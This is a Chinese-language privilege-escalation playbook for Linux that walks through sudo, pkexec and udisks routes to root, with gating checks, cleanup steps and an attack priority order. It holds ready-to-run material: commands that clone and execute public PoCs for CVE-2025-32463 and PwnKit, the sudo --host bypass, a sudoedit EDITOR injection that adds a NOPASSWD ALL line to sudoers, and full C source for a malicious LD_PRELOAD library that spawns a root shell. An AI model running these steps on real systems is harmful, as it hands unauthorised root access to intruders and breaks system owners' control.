# sudo / polkit / udisks 提权

> **TECH：** sudo 规则、sudo 版本洞、pkexec、polkit allow_active、udisks/libblockdev  
> **IMPACT：** uid=0  
> **成功：** `id` 含 `uid=0(root)`  
> 先 `sudo -l` 和 `sudo --version`。规则能 GTFOBins 就不要先打 CVE。

查询与版本对照：`../../shared/cve-enrichment.md`。

---

## 0. 指纹

```bash
sudo -l
sudo --version
pkexec --version 2>/dev/null
ps aux | grep -E 'polkit|udisksd' | grep -v grep
dpkg -l sudo policykit-1 pkexec libblockdev* udisks2 2>/dev/null
rpm -q sudo polkit polkit-pkexec libblockdev udisks2 2>/dev/null
loginctl show-session "$XDG_SESSION_ID" -p Active -p Remote 2>/dev/null
id
```

---

## 1. sudoers GTFOBins / NOPASSWD

见 `gtfobins-common.md`。`(root) NOPASSWD: ALL` → `sudo -i`。有密码且当前用户密码已知 → `sudo -i`。

`sudo -l` 报 `may not run sudo` 仍要看版本洞：CVE-2025-32463 **不需要** sudoers 条目。

---

## 2. CVE-2025-32463 — sudo chwoot（`--chroot`）

任意本地用户 → root。sudo 处理 `-R/--chroot` 时加载用户目录里的 `nsswitch` / NSS 库。

- 影响：sudo **1.9.14 – 1.9.17**（含 1.9.17），修于 **1.9.17p1**
- NVD：https://nvd.nist.gov/vuln/detail/CVE-2025-32463
- PoC：https://github.com/pr0v3rbs/CVE-2025-32463_chwoot  
  EDB 52352 `sudo-chwoot.sh`

### GATES

```bash
sudo --version
# 必须落在 1.9.14–1.9.17。1.9.17p1+ 或 <1.9.14 走别的路径
```

发行版可能 backport。Ubuntu/Debian/RHEL advisory 优先于上游版本号。不确定 → enrichment。

### 执行

按当前 PoC。EDB 逻辑概要（以仓库脚本为准，不要手改 NSS 名字）：

```bash
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot
cd CVE-2025-32463_chwoot
chmod +x sudo-chwoot.sh
./sudo-chwoot.sh
id
```

脚本通常：建 stage 目录、编译恶意 NSS `.so`、`sudo -R <stage> <cmd>` 以 root 加载。成功直接进 root shell。

无 gcc 时先确认 PoC 是否提供预编译，没有就换路径，不要半改脚本。

### RESTORE

```bash
rm -rf /tmp/sudowoot.stage.* /tmp/woot*
```

不要留 root 属主的恶意 `.so`。

---

## 3. CVE-2025-32462 — sudo `--host` 策略绕过

sudoers 用 `Host_Alias` / 主机名限制时，`-h/--host` 本应只配合 `-l`。受影响版本可对 **真正执行** 使用 `-h`，骗过主机检查。

- 影响：sudo **1.8.8 – 1.9.17**，修于 1.9.17p1
- 公告：https://www.sudo.ws/security/advisories/host_any/

### GATES

```bash
sudo -l
sudo --version
grep -Rin "Host_Alias\|Host " /etc/sudoers /etc/sudoers.d 2>/dev/null
hostname
```

必须同时：版本受影响 **且** sudoers 按主机限制（当前主机不允许、另一主机允许）。默认 `ALL` 主机规则打了也没提升。

### 执行

```bash
# 把 ALLOWED_HOST 换成 sudoers 里允许的那个主机名
sudo -h ALLOWED_HOST /bin/bash
sudo -h ALLOWED_HOST id
```

成功：无需 exploit 文件。失败输出仍提示主机不允许 → 版本已修或规则不是按主机分的。

### RESTORE

无文件改动。

---

## 4. CVE-2023-22809 — sudoedit

旧 sudo 对 `sudoedit` 的 `--` 处理可注入 `--editor` 额外文件（如 sudoers）。

```bash
sudo --version
sudo -l | grep -i edit
EDITOR='vim -- /etc/sudoers' sudoedit /etc/passwd
```

只在 `sudoedit` / `sudo -e` 被允许且版本落在 advisory 时打。写入 sudoers 前备份。

```bash
cp /etc/sudoers /tmp/sudoers.bak
# 加：CURRENT_USER ALL=(ALL) NOPASSWD:ALL
sudo -i
```

RESTORE：`visudo` 恢复或拷回 bak。

---

## 5. CVE-2021-3156 Baron Samedit

sudo < 1.9.5p2 堆溢出。公开 PoC 多，但 **现代发行版基本已修**。

```bash
sudo --version
# 1.8.2–1.8.31p2 或 1.9.0–1.9.5p1
```

用当时匹配的公开 exploit（blasty / CQT 等），**对照 tested version**。错版本会崩 sudo，不崩内核，但仍可能把当前会话打挂。

优先 32463/GTFOBins。本洞留给几年没补丁的老箱。

---

## 6. PwnKit — CVE-2021-4034 pkexec

```bash
ls -l $(which pkexec)
pkexec --version
# 发行版补丁：dpkg -s policykit-1 / rpm -q polkit
```

SUID pkexec + 未修：

公开 PoC 很多（ly4k/PwnKit 等）。按 README 编译运行。成功 `id` = 0。

已修：pkexec 拒绝空 argv，PoC 立即失败。不要换十个 PwnKit 变体硬砸。

RESTORE：无持久文件则无；自己编译的二进制删掉。

---

## 7. CVE-2025-6019 — libblockdev / udisks（allow_active → root）

Qualys：udisks 给 allow_active 用户 resize/mount 时未保持 nosuid，恶意 XFS 镜像里的 SUID root shell 可执行。

- https://access.redhat.com/security/cve/cve-2025-6019
- 多数带 udisks2 的桌面/服务器发行版曾受影响；**需要 allow_active**（本地座充会话，或被 6018 拿到）。

### GATES

```bash
loginctl
loginctl show-session "$XDG_SESSION_ID" -p Active -p Remote
ps aux | grep udisksd
id
# polkit：当前用户能否 org.freedesktop.udisks2.filesystem-mount 等
```

SSH 会话通常 `Remote=yes`，不是 allow_active。这时需要 CVE-2025-6018（SUSE PAM）或真实图形/console 会话。

公开 PoC：https://github.com/guinea-offensive-security/CVE-2025-6019 （以仓库为准）。

成功：SUID root shell 可执行 → `./shell -p` → uid=0。

### RESTORE

卸恶意 loop/XFS 镜像、删 SUID 文件、`udisksctl unmount`。

---

## 8. CVE-2025-6018 — SUSE PAM → allow_active

Qualys 链：openSUSE Leap 15 / SLE 15 PAM 把 SSH 等当成 Active，再接 6019 到 root。

```bash
cat /etc/os-release | grep -Ei 'suse|sles'
```

不是 SUSE 15 家族 → 不要打 6018。可直接评估 6019（若已是 seat 活跃用户）。

无稳定公开一键脚本时：按 Qualys 公告验证 PAM `pam_loginuid`/`pam-config` 是否仍把 remote 标 active，再进 6019。不编造 PAM 写入命令。

---

## 9. LD_PRELOAD（sudo env_keep）

```bash
sudo -l    # 必须看到 env_keep+=LD_PRELOAD 或 SETENV
```

```c
// /tmp/x.c
#include <stdlib.h>
#include <unistd.h>
void _init(){ setuid(0); setgid(0); system("/bin/bash -p"); }
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so <允许的命令>
```

无 SETENV/env_keep 时 `LD_PRELOAD=` 会被 sudo 丢掉。

RESTORE：`rm /tmp/x.c /tmp/x.so`

---

## IMPACT 顺序

```text
1. sudo -l GTFOBins / NOPASSWD ALL
2. CVE-2025-32463（版本命中，无规则也打）
3. CVE-2025-32462（主机限制规则）
4. sudoedit / LD_PRELOAD
5. PwnKit / 6019（条件匹配）
6. Baron Samedit（老箱）
```

不要一上来编译 kernel exploit。
